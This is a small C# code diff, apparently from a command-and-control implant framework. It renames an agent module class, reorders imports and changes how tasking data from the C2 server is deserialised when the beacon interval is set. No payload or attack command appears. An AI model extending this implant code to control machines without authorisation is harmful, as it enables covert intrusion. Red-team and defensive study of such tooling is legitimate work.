@@ -3,15 +3,14 @@ using Agent.Interfaces;
 using Agent.Models;
 
 using Shared.Models;
-using Shared.Utilities;
 
 using System;
-using System.Linq;
 using System.Collections.Generic;
+using System.Linq;
 
 namespace Agent.Modules
 {
-    public class CoreAgentModule : IAgentModule
+    public class CoreModule : IAgentModule
     {
         AgentController Agent;
         ConfigController Config;
@@ -47,7 +46,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
 
                 var interval = parameters.FirstOrDefault(p => p.Name.Equals("Interval", StringComparison.OrdinalIgnoreCase)).Value;
 
